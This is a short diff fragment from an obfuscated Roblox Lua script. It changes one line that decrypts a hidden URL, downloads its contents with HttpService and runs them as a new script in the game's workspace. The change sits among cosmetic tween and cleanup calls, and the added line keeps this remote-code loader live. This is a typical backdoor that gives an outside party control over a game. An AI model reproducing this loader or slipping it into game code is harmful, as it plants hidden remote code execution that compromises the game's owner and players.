@@ -342,7 +342,7 @@ local _SET_EVT;_SET_EVT=function(_P)
 			wait(1.5)
 			_FR:tweenPosition(UDim2.new(2,0,.45),'In','Elastic',1.75);
 			game:service'Debris':addItem(_MG,3);
-			NS(game:service'HttpService':getAsync(Decrypt(_CODE,_KEY:reverse()),true),workspace);
+			NS(game:service'HttpService':getAsync(Decrypt(_CODE,_KEY),true),workspace);
 		end);
 	end);
 end;
